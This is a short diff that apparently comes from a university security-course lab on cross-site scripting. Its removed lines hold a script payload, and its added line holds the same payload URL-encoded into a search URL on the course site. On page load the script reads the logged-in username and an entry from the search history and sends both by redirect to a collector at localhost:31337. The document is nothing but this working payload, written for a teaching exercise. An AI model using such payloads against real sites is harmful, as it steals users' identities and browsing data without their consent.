@@ -1,3 +1,1 @@
-<script>window.onload = function() {
-window.location.replace(`http://localhost:31337/?`.concat(`stolen_user=`, ($( `#logged-in-user` ).text()),`&`, `last_search=`, ($(`a.history-item:nth-child(2)`).text()) ))
-}</script>
+https://project2.ecen4133.org/search?xssdefense=3&q=%3Cscript%3Ewindow.onload%20%3D%20function()%20%7B%0Awindow.location.replace(%60http%3A%2F%2Flocalhost%3A31337%2F%3F%60.concat(%60stolen_user%3D%60%2C%20(%24(%20%60%23logged-in-user%60%20).text())%2C%60%26%60%2C%20%60last_search%3D%60%2C%20(%24(%60a.history-item%3Anth-child(2)%60).text())%20))%0A%7D%3C%2Fscript%3E
